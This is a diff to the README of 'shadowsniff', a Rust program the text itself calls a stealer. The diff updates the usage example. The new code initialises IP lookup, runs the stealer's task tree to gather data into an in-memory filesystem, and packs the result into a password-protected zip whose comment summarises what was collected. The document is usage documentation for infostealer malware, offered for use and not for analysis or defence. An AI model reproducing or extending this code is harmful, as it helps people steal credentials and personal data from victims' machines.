@@ -87,25 +87,45 @@ When started, each task runs in its own thread.
 A composite task waits for all its subtasks to finish before it completes.
 
 The stealer **does not use the Rust standard library**.
-The `utils::path::Path` type used in `run` comes from the crate `utils`.
-
-Before calling `SniffTask::new().run(&base_path)`, you **must** call `ipinfo::init_ip_info()`, otherwise it won't work.
 
 ```rust
-use utils::path::Path;
+use filesystem::path::Path;
 use ipinfo::init_ip_info;
 use shadowsniff::SniffTask;
+use collector::atomic::AtomicCollector;
+use collector::DisplayCollector;
+use filesystem::storage::StorageFileSystem;
+use filesystem::virtualfs::VirtualFileSystem;
+use filesystem::FileSystem;
+use zip::ZipArchive;
 
-fn main() {
+pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
     if !init_ip_info() {
         panic!("Failed to initialize IP info");
     }
 
-    let base_path = Path::new("output");
-
+    let fs = VirtualFileSystem::default(); // for build log in-memory
+    let collector = AtomicCollector::default();
+    
+    let out = Path::new("output");
+    let _ = fs.mkdir(&out);
+    
     unsafe {
-        SniffTask::new().run(&base_path);
+        SniffTask::new().run(&out, &fs, &collector);
     }
+
+    let displayed_collector = format!("{}", DisplayCollector(collector));
+
+    let zip = ZipArchive::default()
+        .add_folder_content(&fs, &out)
+        .password("shadowsniff-output")
+        .comment(displayed_collector)
+        .create();
+
+    let out = Path::new("output.zip");
+    let _ = StorageFileSystem.write_file(&out, &zip);
+    
+    0
 }
 ```
 
